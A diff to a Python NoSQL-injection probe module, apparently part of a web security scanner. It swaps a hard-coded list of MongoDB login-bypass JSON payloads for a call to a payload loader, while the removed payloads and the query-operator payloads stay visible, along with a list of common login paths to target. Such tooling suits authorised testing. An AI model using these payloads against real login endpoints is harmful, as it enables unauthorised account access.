@@ -1,5 +1,6 @@
 """nosql_injection — MongoDB/NoSQL injection probe via JSON bodies + query operators"""
 from core.http import HttpClient
+from core.payload_source import get_payloads
 import json
 
 QUERY_PAYLOADS = [
@@ -10,15 +11,7 @@ QUERY_PAYLOADS = [
     ("login[$exists]", "true", "password[$exists]", "true"),
 ]
 
-JSON_PAYLOADS = [
-    {"username": {"$ne": None}, "password": {"$ne": None}},
-    {"username": {"$gt": ""}, "password": {"$gt": ""}},
-    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
-    {"username": {"$exists": True}, "password": {"$exists": True}},
-    {"username": "admin", "password": {"$ne": None}},
-    {"$where": "this.username=='admin'"},
-    {"username": "admin'||'1'=='1", "password": "x"},
-]
+JSON_PAYLOADS = get_payloads("nosql", limit=15)
 
 LOGIN_PATHS = ["/login","/api/login","/api/auth","/auth","/signin","/user/login","/session"]
 
